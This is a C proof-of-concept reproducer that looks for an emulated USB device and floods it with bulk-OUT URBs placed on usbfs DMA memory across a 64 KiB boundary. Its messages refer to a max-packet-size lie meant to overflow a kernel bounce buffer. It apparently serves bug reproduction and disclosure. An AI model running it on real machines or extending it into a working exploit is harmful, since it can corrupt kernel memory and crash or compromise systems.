// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <linux/usbdevice_fs.h>

#define VID 0x1d6b
#define PID 0xbeef

#define MAP_SIZE   (256 * 1024)
#define BOUNDARY   (64 * 1024)
#define HEAD_TRB   64
#define XFER_LEN   4096
#define EP_OUT     0x01
#define ROUNDS     900

static int find_dev(char *path, size_t plen)
{
	DIR *bd, *dd;
	struct dirent *be, *de;
	char bus[256], dev[512];
	unsigned char d[18];
	int fd, n;

	bd = opendir("/dev/bus/usb");
	if (!bd)
		return -1;
	while ((be = readdir(bd))) {
		if (be->d_name[0] == '.')
			continue;
		snprintf(bus, sizeof(bus), "/dev/bus/usb/%s", be->d_name);
		dd = opendir(bus);
		if (!dd)
			continue;
		while ((de = readdir(dd))) {
			if (de->d_name[0] == '.')
				continue;
			snprintf(dev, sizeof(dev), "%s/%s", bus, de->d_name);
			fd = open(dev, O_RDONLY);
			if (fd < 0)
				continue;
			n = read(fd, d, sizeof(d));
			close(fd);
			if (n != 18)
				continue;
			if ((d[8] | (d[9] << 8)) == VID &&
			    (d[10] | (d[11] << 8)) == PID) {
				closedir(dd);
				closedir(bd);
				snprintf(path, plen, "%s", dev);
				return 0;
			}
		}
		closedir(dd);
	}
	closedir(bd);
	return -1;
}

int main(void)
{
	char path[512];
	unsigned char *map;
	struct usbdevfs_urb urb, *done;
	unsigned int ifnum = 0;
	int fd, i, tries, hits = 0, fails = 0;

	setvbuf(stdout, NULL, _IONBF, 0);

	for (tries = 0; tries < 200; tries++) {
		if (find_dev(path, sizeof(path)) == 0)
			break;
		usleep(50000);
	}
	if (tries == 200) {
		printf("[-] fake USB device %04x:%04x not found\n", VID, PID);
		return 1;
	}
	printf("[+] device node: %s\n", path);

	fd = open(path, O_RDWR);
	if (fd < 0) {
		perror("[-] open");
		return 1;
	}

	if (ioctl(fd, USBDEVFS_CLAIMINTERFACE, &ifnum) < 0)
		printf("[!] claim interface: %s (continuing)\n", strerror(errno));
	else
		printf("[+] claimed interface 0\n");

	map = mmap(NULL, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED) {
		perror("[-] mmap usbfs");
		return 1;
	}
	printf("[+] mmap'd %d bytes of coherent DMA memory at %p\n",
	       MAP_SIZE, map);
	memset(map, 0x41, MAP_SIZE);

	printf("[*] submitting %d bulk-OUT URBs (first TRB = %d bytes,"
	       " maxp lie = 1024, bounce_buf = 512)\n", ROUNDS, HEAD_TRB);

	for (i = 0; i < ROUNDS; i++) {
		memset(&urb, 0, sizeof(urb));
		urb.type = USBDEVFS_URB_TYPE_BULK;
		urb.endpoint = EP_OUT;
		urb.buffer = map + BOUNDARY - HEAD_TRB;
		urb.buffer_length = XFER_LEN;
		urb.usercontext = (void *)(long)i;

		if (ioctl(fd, USBDEVFS_SUBMITURB, &urb) < 0) {
			if (fails++ < 5)
				printf("[!] submit %d: %s\n", i, strerror(errno));
			usleep(1000);
			continue;
		}
		done = NULL;
		if (ioctl(fd, USBDEVFS_REAPURB, &done) < 0) {
			if (fails++ < 5)
				printf("[!] reap %d: %s\n", i, strerror(errno));
			continue;
		}
		hits++;
		if ((i % 100) == 0)
			printf("[*] %d URBs done\n", i);
	}

	printf("[+] finished: %d completed, %d failed\n", hits, fails);
	return 0;
}
